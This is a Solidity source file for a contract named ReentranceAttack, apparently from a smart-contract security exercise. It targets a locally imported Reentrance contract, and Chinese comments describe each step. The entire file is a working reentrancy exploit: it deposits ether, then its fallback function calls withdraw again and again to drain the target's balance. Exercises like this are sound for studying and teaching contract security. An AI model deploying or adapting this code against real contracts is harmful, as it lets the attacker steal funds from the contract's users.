pragma solidity ^0.4.26;

import "./Reentrance.sol";

contract ReentranceAttack{
    Reentrance re;

    function ReentranceAttack(address _target) public payable {
        re = Reentrance(_target);
    }
    function wallet() constant returns(uint256 result) {
        return this.balance; // 返回该合约的余额
    }
    function deposit() public payable {
        re.deposit.value(msg.value)(); // 先进行存款
    }
    function attack() public {
        re.withdraw(1 ether); // 提款进行攻击
    }
    function() public payable {
        if (address(re).balance >= 1 ether) {
            re.withdraw(1 ether); // 攻击者递归进行提款操作
        }
    }
}
